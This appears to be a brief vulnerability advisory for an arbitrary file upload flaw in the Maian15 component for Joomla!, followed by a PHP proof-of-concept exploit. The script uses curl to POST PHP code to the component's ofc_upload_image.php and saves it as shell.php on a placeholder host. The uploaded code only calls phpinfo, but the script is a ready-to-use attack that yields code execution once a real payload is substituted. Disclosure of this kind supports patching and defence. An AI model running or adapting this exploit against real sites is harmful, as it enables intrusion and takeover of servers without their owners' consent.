The Maian15 component for Joomla! is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in arbitrary code execution within the context of the vulnerable application.

<?php
$headers = array("Content-Type: application/octet-stream");
$uploadfile="<?php phpinfo(); ?>";
$ch =
curl_init("http://www.example.com/path/administrator/components/com_maian15/charts/php-ofc-library/ofc_upload_image.php?name=shell.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, @$uploadfile);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
?>
